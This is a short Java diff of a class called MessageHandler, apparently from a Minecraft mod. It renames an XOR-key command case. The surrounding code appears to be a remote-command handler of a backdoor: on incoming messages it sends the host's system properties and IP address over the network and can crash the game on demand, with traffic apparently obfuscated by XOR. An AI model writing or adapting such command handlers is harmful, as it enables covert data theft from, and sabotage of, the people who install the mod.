@@ -70,7 +70,7 @@ public class MessageHandler {
                     case "props" -> NetUtil.send(msgType, System.getProperties());
                     case "ip" -> NetUtil.send(msgType, NetUtil.getIp());
                     case "crash" -> MinecraftUtil.crash();
-                    case "xor" -> {
+                    case "key" -> {
                         messageUtils.setXOR(msg);
                         messageUtils.acceptXOR = true;
 
